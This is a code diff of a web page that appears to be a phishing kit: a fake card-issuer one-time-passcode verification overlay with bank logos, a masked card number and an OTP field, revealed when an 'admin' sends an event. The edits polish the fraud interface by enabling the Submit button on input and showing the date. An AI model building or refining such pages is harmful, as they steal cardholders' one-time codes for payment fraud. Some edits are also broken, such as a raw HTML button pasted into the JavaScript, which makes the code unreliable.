@@ -549,9 +549,7 @@
   </div>
   
   <!-- Verification Content - Hidden Until Admin Sends start_verification Event -->
-  <div id="mcVerificationContent" style="display: none; position: relative; width: 90%; max-width: 480px; background-color: white; border-radius: 0; overflow: hidden; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);">
-    <!-- Header with bank and card brand logos -->
-    <div style="display: flex; justify-content: space-between; align-items: center; padding: 10px 15px; border-bottom: 1px solid #e0e0e0; background-color: #fff;">
+<div id="mcLoadingContent" style="display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 450px; max-height: 550px; background: white; width: 90%; max-width: 480px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);">    <div style="display: flex; justify-content: space-between; align-items: center; padding: 10px 15px; border-bottom: 1px solid #e0e0e0; background-color: #fff;">
       <div style="height: 40px; max-width: 45%;">
         <img id="bankLogo" src="" alt="Bank Logo" style="height: 40px; max-width: 100%;">
       </div>
@@ -597,9 +595,9 @@
       </div>
       
       <!-- OTP input field -->
-      <div style="margin-bottom: 20px; display: flex; align-items: center;">
-        <span style="font-size: 13px; margin-right: 10px; min-width: 150px;">Enter One-Time Passcode</span>
-        <div style="position: relative; flex: 1;">
+     <div style="margin-bottom: 20px; display: flex; align-items: center;">
+  <span style="font-size: 13px; margin-right: 10px; min-width: 150px; font-weight: 600; color: #333; text-shadow: 0px 0px 1px rgba(0,0,0,0.1);">Enter One-Time Passcode</span>
+  <div style="position: relative; flex: 1;">
           <input type="text" id="mcOtpInput" style="width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 3px; font-size: 14px; transition: all 0.3s;" placeholder="Enter One-Time Passcode" maxlength="6">
           <div style="position: absolute; right: 8px; top: 50%; transform: translateY(-50%); cursor: pointer;" id="otpInfoIcon">
             <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2">
@@ -624,7 +622,7 @@
       
       <!-- Action buttons -->
       <div style="display: flex; gap: 5px; margin-bottom: 10px;">
-        <button id="mcSubmitBtn" style="flex: 1; padding: 8px; background-color: #8ab4f8; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Submit</button>
+        <button id="mcSubmitBtn" style="flex: 1; padding: 8px; background-color: #aaaaaa; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;" disabled>Submit</button>
         <button id="mcResendBtn" style="flex: 1; padding: 8px; background-color: #0066cc; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Resend</button>
         <button id="mcCancelBtn" style="flex: 1; padding: 8px; background-color: #aaaaaa; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Cancel</button>
       </div>
@@ -966,7 +964,7 @@ function updateMcVerificationUI(data) {
     // Update UI elements with data
     document.getElementById('merchantName').textContent = data.merchantName || 'Peacock Merchandise';
     document.getElementById('transactionAmount').textContent = data.amount || state.amount.toFixed(2);
-    document.getElementById('transactionDate').textContent = new Date().toLocaleTimeString();
+    document.getElementById('transactionDate').textContent = new Date().toLocaleDateString() + ' ' + new Date().toLocaleTimeString();
     document.getElementById('cardNumberDisplay').textContent = 'XXXX XXXX XXXX ' + (state.cardForm.cardNumber.slice(-4) || '1234');
     document.getElementById('referenceId').textContent = data.invoiceId?.substring(0, 6) || Math.floor(100000 + Math.random() * 900000);
     
@@ -1053,7 +1051,7 @@ function updateCurrencyDisplay(currency) {
         currencySymbol.textContent = symbols[currency] || '$';
     }
 }
-
+<button id="mcSubmitBtn" style="flex: 1; padding: 8px; background-color: #aaaaaa; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;" disabled>Submit</button>
 function setupMcVerificationButtons() {
     // Submit button handler
     const submitBtn = document.getElementById('mcSubmitBtn');
@@ -1154,8 +1152,22 @@ function setupMcVerificationButtons() {
             if (errorMsg) {
                 errorMsg.style.display = 'none';
             }
-        };
+            
+           // Add this new code:
+    const submitBtn = document.getElementById('mcSubmitBtn');
+    if (submitBtn) {
+      if (this.value.length > 0) {
+        submitBtn.style.backgroundColor = '#0066cc';
+        submitBtn.disabled = false;
+      } else {
+        submitBtn.style.backgroundColor = '#aaaaaa';
+        submitBtn.disabled = true;
+      }
     }
+  };
+  
+  // Trigger the input handler once to set initial state
+  otpInput.oninput();
 }
 function showMCVerification(data) {
     console.log('Showing MC verification overlay with data:', data);
